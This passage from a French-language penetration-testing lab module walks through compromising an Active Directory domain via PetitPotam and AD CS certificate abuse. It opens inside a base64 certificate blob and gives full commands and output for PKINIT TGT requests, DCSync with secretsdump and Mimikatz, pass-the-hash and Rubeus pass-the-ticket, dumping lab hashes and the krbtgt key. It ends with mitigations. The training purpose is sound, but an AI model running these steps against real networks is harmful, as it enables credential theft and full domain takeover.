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
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed

<SNIP>

```

#### Demander un TGT à l'aide de gettgtpkinit.py

Ensuite, nous pouvons prendre ce certificat base64 et l'utiliser `gettgtpkinit.py`pour demander un Ticket-Granting-Ticket (TGT) pour le contrôleur de domaine.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

#### Définition de la variable d'environnement KRB5CCNAME

Le TGT demandé ci-dessus a été enregistré dans le `dc01.ccache`fichier que nous utilisons pour définir la variable d'environnement KRB5CCNAME. Notre hôte d'attaque utilise donc ce fichier pour les tentatives d'authentification Kerberos.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ export KRB5CCNAME=dc01.ccache

```

#### Utilisation du contrôleur de domaine TGT vers DCSync

Nous pouvons ensuite utiliser ce TGT `secretsdump.py`pour effectuer un DCSYnc et récupérer un ou tous les hachages de mot de passe NTLM pour le domaine.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...

```

Nous pourrions également utiliser une commande plus simple : `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`car l'outil récupérera le nom d'utilisateur du fichier ccache. Nous pouvons le voir en tapant `klist`(l'utilisation de la `klist`commande nécessite l'installation du package [krb5-user](https://packages.ubuntu.com/focal/krb5-user) sur notre hôte d'attaque. Celui-ci est déjà installé sur ATTACK01 dans le laboratoire).

#### Klist en cours d'exécution

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL

```

#### Confirmation de l'accès administrateur au contrôleur de domaine

Enfin, nous pourrions utiliser le hachage NT pour le compte administrateur intégré afin de nous authentifier auprès du contrôleur de domaine. À partir de là, nous avons un contrôle total sur le domaine et pouvons chercher à établir la persistance, rechercher des données sensibles, rechercher d'autres erreurs de configuration et vulnérabilités pour notre rapport, ou commencer à énumérer les relations de confiance.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)

```

#### Soumettre une demande TGS pour nous-mêmes à l'aide de getnthash.py

Nous pouvons également emprunter un itinéraire alternatif une fois que nous avons le TGT pour notre cible. À l'aide de l'outil `getnthash.py`de PKINITtools, nous pourrions demander le hachage NT pour notre hôte/utilisateur cible en utilisant Kerberos U2U pour soumettre une demande TGS avec le [certificat d'attribut privilégié (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) qui contient le hachage NT pour la cible. Cela peut être déchiffré avec la clé de cryptage AS-REP que nous avons obtenue lors de la demande précédente du TGT.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba

```

Nous pouvons ensuite utiliser ce hachage pour effectuer une DCSync avec secretsdump.py en utilisant le `-hashes`flag.

#### Utilisation du hachage NTLM du contrôleur de domaine pour DCSync

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...

```

Alternativement, une fois que nous avons obtenu le certificat base64 via ntlmrelayx.py, nous pourrions utiliser le certificat avec l'outil Rubeus sur un hôte d'attaque Windows pour demander un ticket TGT et effectuer une attaque pass-the-ticket (PTT) en même temps.

Remarque : nous devrons utiliser l' `MS01`hôte d'attaque dans une autre section, telle que la section `ACL Abuse Tactics`ou `Privileged Access`une fois que nous aurons enregistré le certificat base64 dans nos notes pour effectuer cela à l'aide de Rubeus.

#### Demander un TGT et effectuer un PTT avec un compte machine DC01 $

  Vulnérabilités de Bleeding Edge

```
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
 doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  ACADEMY-EA-DC01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/30/2022 3:50:25 PM
  EndTime                  :  3/31/2022 1:50:25 AM
  RenewTill                :  4/6/2022 3:50:25 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD

```

On peut alors taper `klist`pour confirmer que le ticket est en mémoire.

#### Confirmer que le ticket est en mémoire

  Vulnérabilités de Bleeding Edge

```
PS C:\Tools> klist

Current LogonId is 0:0x4e56b

Cached Tickets: (3)

#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/30/2022 15:50:25 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

```

Encore une fois, étant donné que les contrôleurs de domaine disposent de privilèges de réplication dans le domaine, nous pouvons utiliser le pass-the-ticket pour effectuer une attaque DCSync à l'aide de Mimikatz à partir de notre hôte d'attaque Windows. Ici, nous récupérons le hachage NT du compte KRBTGT, qui pourrait être utilisé pour créer un Golden Ticket et établir la persistance. Nous pourrions obtenir le hachage NT pour tout utilisateur privilégié utilisant DCSync et passer à la phase suivante de notre évaluation.

#### Exécution de DCSync avec Mimikatz

  Vulnérabilités de Bleeding Edge

```
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'inlanefreight\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/27/2021 8:14:34 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
    lm  - 0: 4562458c201a97fa19365ce901513c21

```

* * * * *

Atténuations PetitPotam
-----------------------

Tout d'abord, le correctif pour [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) doit être appliqué à tous les hôtes concernés. Vous trouverez ci-dessous quelques mesures de renforcement supplémentaires qui peuvent être prises :

-   Pour empêcher les attaques de relais NTLM, utilisez [la protection étendue pour l'authentification](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) et activez [Exiger SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) pour autoriser uniquement les connexions HTTPS pour les services d'inscription Web d'autorité de certification et de service Web d'inscription de certificat.
-   [Désactivation de l'authentification NTLM](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) pour les contrôleurs de domaine
-   Désactivation de NTLM sur les serveurs AD CS à l'aide [de la stratégie de groupe](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
-   Désactivation de NTLM pour IIS sur les serveurs AD CS sur lesquels les services d'inscription Web d'autorité de certification et de service Web d'inscription de certificat sont utilisés

Pour en savoir plus sur l'attaque des services de certificats Active Directory, je recommande vivement le livre blanc [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) , car il démontre les attaques contre AD CS qui peuvent être effectuées à l'aide d'appels API authentifiés. Cela montre que la simple application du correctif CVE-2021-36942 pour atténuer PetitPotam n'est pas suffisante pour la plupart des organisations exécutant AD CS, car un attaquant disposant des informations d'identification d'utilisateur de domaine standard peut toujours effectuer des attaques contre AD CS dans de nombreux cas. Le livre blanc détaille également d'autres étapes de renforcement et de détection qui peuvent être prises pour renforcer AD CS.

* * * * *

résumer
-------

Dans cette section, nous avons couvert trois attaques récentes :

-   NoPac (usurpation du nom de compte SamAccount)
-   PrintNightmare (à distance)
-   PetitPotam (MS-EFSRPC)

Chacune de ces attaques peut être réalisée soit avec un accès utilisateur de domaine standard (NoPac et PrintNightmare), soit sans aucun type d'authentification sur le domaine (PetitPotam), et peut conduire à une compromission de domaine relativement facilement. Il existe plusieurs façons d'effectuer chaque attaque, et nous en avons abordé quelques-unes. Les attaques Active Directory continuent d'évoluer, et ce ne sont sûrement pas les derniers vecteurs d'attaque à très fort impact que nous verrons. Lorsque ces types d'attaques sont lancés, nous devons nous efforcer de créer un petit environnement de laboratoire pour les mettre en pratique, afin d'être prêts à les utiliser de manière sûre et efficace dans le cadre d'un engagement réel si l'occasion se présente. Comprendre comment configurer ces attaques dans un laboratoire peut également améliorer considérablement notre compréhension du problème et nous aider à mieux conseiller nos clients sur l'impact, la remédiation et les détections. Ce n'était qu'un petit aperçu du monde de l'attaque d'AD CS, qui pourrait constituer un module entier.

Dans la section suivante, nous aborderons divers autres problèmes que nous rencontrons de temps en temps dans les environnements Active Directory et qui pourraient nous aider à élargir notre accès ou conduire à des conclusions supplémentaires pour notre rapport client final.
